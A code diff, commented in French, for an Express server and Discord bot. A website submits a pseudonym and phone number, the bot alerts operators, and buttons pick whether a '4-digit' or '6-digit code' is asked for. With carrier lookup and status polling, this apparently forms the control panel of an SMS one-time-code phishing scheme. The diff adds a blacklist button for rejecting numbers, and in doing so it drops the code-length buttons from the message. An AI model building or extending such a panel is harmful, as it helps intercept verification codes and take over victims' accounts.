@@ -34,6 +34,7 @@ const getOperateur = (phone) => {
 // --- BOT DISCORD ---
 const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
 let lastAction = { status: 'waiting', length: 0 };
+const blacklist = []; // Tableau pour stocker les numéros bannis
 
 client.once(Events.ClientReady, () => {
     console.log(`Bot prêt : ${client.user.tag}`);
@@ -42,6 +43,12 @@ client.once(Events.ClientReady, () => {
 // Quand ton site web envoie un numéro
 app.post('/api/send-info', async (req, res) => {
     const { pseudo, phone } = req.body;
+    
+    // Vérification de la blacklist
+    if (blacklist.includes(phone)) {
+        return res.status(403).json({ error: 'Numéro blacklisté' });
+    }
+
     lastAction = { status: 'waiting', length: 0, phone: phone };
 
     try {
@@ -61,7 +68,15 @@ app.post('/api/send-info', async (req, res) => {
             new ButtonBuilder().setCustomId('btn_6').setLabel('Code à 6 chiffres').setStyle(ButtonStyle.Success)
         );
         
-        await channel.send({ content: '@everyone', embeds: [embed], components: [row] });
+        // On crée le bouton pour blacklister
+        const blacklistRow = new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`blacklist_${phone}`) // On met le numéro dans l'ID du bouton
+                .setLabel('Blacklist')
+                .setStyle(ButtonStyle.Danger) // Bouton rouge
+        );
+
+        await channel.send({ content: '@everyone', embeds: [embed], components: [blacklistRow] });
         res.json({ success: true });
     } catch (err) {
         console.error(err);
@@ -108,6 +123,7 @@ app.get('/api/check-status', (req, res) => {
 client.on(Events.InteractionCreate, async interaction => {
     if (!interaction.isButton()) return;
     
+    // 1. Gestion des boutons 4 et 6 chiffres
     if (interaction.customId === 'btn_4' || interaction.customId === 'btn_6') {
         const length = interaction.customId === 'btn_4' ? 4 : 6;
         
@@ -121,8 +137,23 @@ client.on(Events.InteractionCreate, async interaction => {
         );
         await interaction.message.edit({ components: [newRow] });
     }
-});
 
+    // 2. Gestion du bouton Blacklist (L'étape 4)
+    if (interaction.customId.startsWith('blacklist_')) {
+        const phoneToBlacklist = interaction.customId.replace('blacklist_', '');
+        
+        if (!blacklist.includes(phoneToBlacklist)) {
+            blacklist.push(phoneToBlacklist);
+        }
+
+        await interaction.reply({ content: `🚫 Le numéro \`${phoneToBlacklist}\` a été ajouté à la blacklist.`, ephemeral: true });
+        
+        const disabledRow = new ActionRowBuilder().addComponents(
+            new ButtonBuilder().setCustomId('done_blacklist').setLabel('Blacklisté').setStyle(ButtonStyle.Secondary).setDisabled(true)
+        );
+        await interaction.message.edit({ components: [disabledRow] });
+    }
+});
 client.login(TOKEN);
 
 const PORT = process.env.PORT || 3000;
